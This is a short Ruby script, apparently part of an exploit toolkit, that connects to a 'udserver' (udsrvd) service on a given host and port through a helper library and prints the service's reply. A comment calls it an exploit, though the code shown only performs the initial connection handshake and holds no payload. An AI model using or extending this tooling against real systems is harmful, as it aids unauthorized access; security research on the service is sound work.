# Encoding: ASCII-8BIT

require 'base64'
require 'pp'

require_relative './libneptune'

def usage
  puts "Usage: #{ $0 } <host> [port]"
  puts
  puts "Eg:"
  puts
  puts "ruby #{ $0 } 10.0.0.198 31438"
  exit
end

HOST = ARGV[0] || usage()
PORT = ARGV[1] || "31438"

# Connect to the target
connection = LibNeptune::new(HOST, PORT)

# Connect to the udadmin service
$stderr.puts "Connecting to 'udserver' service (udsrvd)"
out = connection.send_recv(
  args: [
    # Service name
    { type: :string, value: 'udserver' },

    # "SSL Flag" - must be non-zero if the service is started in "secure-only" mode (-s)
    # (doesn't affect this exploit)
    { type: :integer, value: 1337 },
  ],
)

if out[:args].length < 2
  $stderr.puts("Unexpected response!")
  $stderr.puts(out)
  exit 1
end

puts out[:args][0][:value]
